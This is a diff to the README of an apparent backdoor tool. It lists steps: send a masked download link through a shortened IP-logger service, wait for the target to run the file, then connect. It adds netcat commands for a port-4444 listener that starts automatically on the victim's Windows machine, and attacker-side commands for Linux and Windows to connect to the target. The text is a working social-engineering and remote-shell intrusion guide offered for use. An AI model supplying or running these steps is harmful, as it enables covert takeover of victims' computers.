@@ -44,9 +44,20 @@ This tool is designed to:
 2. Send the masked download link using a shortened IP logger service.
 3. Wait for the target to run the file.
 4. Connect to the shell:
-   - This is the command that triggers the backdoor in our Window machine (Runs automatically on running the Python file).
+- This is the command that triggers the backdoor in our Window machine (Runs automatically on running the Python file).
    ```bash
-   nc64 -lvp 4444 
+   nc64 -lvp 4444
+   ```
+- The command attacjer needs to run in their machines.
+  - For Linux
+   ```bash
+   nc <ip_address_of _the_target_machine> 4444
+   ```
+  - For Windows
+    ```bash
+    nc64 <ip_address_of _the_target_machine> 4444
+    ```
+    
 6. Enjoy responsibly (or face karmic doom).
   ---
 
